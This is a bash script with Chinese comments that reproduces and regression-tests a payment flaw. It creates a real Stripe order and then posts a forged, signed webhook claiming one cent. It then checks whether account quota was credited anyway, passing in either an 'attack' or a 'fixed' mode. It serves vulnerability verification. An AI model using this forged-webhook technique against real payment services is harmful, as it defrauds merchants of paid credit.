#!/usr/bin/env bash
# 验证：即使通道匹配（Stripe 单 + Stripe webhook），
# 若 webhook 的 amount_total 与本地订单 Money 不符也应拒绝。
#
# 环境变量：BASE_URL / USER_COOKIE / STRIPE_WEBHOOK_SECRET（可空）/ STRIPE_AMOUNT
#          EXPECT=attack（默认，复现）/ fixed（修复后）
set -euo pipefail
cd "$(dirname "$0")"
# shellcheck source=_lib.sh
source ./_lib.sh
check_deps
: "${STRIPE_AMOUNT:=100}"
: "${EXPECT:=attack}"

echo "==> 模式: EXPECT=$EXPECT  STRIPE_WEBHOOK_SECRET=${STRIPE_WEBHOOK_SECRET:-(空)}"
quota_before=$(get_quota)
echo "==> quota_before=$quota_before"

echo "==> 创建合法的 Stripe 订单 (amount=$STRIPE_AMOUNT)"
trade_no=$(create_stripe_order "$STRIPE_AMOUNT")
[[ -n "$trade_no" ]] || { echo "未拿到 trade_no" >&2; exit 2; }
echo "  tradeNo=$trade_no"

echo "==> 发送 amount_total=1（1 分钱）的 webhook，用来冒充 \$${STRIPE_AMOUNT} 的订单"
payload=$(build_stripe_event "$trade_no" 1 usd)
sig=$(stripe_sign "$STRIPE_WEBHOOK_SECRET" "$payload")
post_stripe_webhook "$payload" "$sig" >/dev/null || true

sleep 1
quota_after=$(get_quota)
delta=$(( quota_after - quota_before ))
echo "==> quota delta = $delta"

if [[ "$delta" -gt 0 ]]; then
  echo "🚨 以 \$0.01 冒充 \$${STRIPE_AMOUNT} 入账成功（漏洞复现）"
  status="attack"
else
  echo "🛡️  金额不一致被拒"
  status="fixed"
fi

[[ "$status" == "$EXPECT" ]] && { echo "✅ 符合预期"; exit 0; } \
  || { echo "❌ 与预期不符（EXPECT=$EXPECT GOT=$status）" >&2; exit 1; }
